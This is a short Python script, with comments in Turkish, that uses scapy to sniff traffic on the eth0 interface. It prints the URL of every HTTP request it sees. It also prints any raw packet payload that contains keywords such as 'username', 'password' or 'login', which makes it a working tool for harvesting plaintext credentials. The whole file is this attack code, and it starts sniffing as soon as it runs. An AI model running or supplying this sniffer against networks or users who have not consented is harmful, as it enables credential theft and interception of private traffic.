#!/usr/bin/env python
# coding=utf-8
import scapy.all as scapy
from scapy_http import http
import scapy_http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processSniffedPacket)  # ,filter="udp", "arp", "tcp" "port 21" (ftp filtreleme) -> bu parametreleri de girebilirsin.

                                                                         # Ancak http yi filtreleyemedigi icin 3. parti bir kutuphane kullanıyoruz
def getUrl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def getInputInfo(packet):
    if packet.haslayer(scapy.Raw):
        # print(packet.show())
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "uname", "password", "pass", "login"]

        for keyword in keywords:
            if keyword in load:
                return load
        return None


def processSniffedPacket(packet):
    if packet.haslayer(http.HTTPRequest):  # burasi ethernet tcp udp
        url = getUrl(packet)
        # print(packet.show())
        print("[+] HTTP Request -> "+ url)
        load = getInputInfo(packet)
        if load:
            print("[+] Possible user input -> " + load)


sniff("eth0")
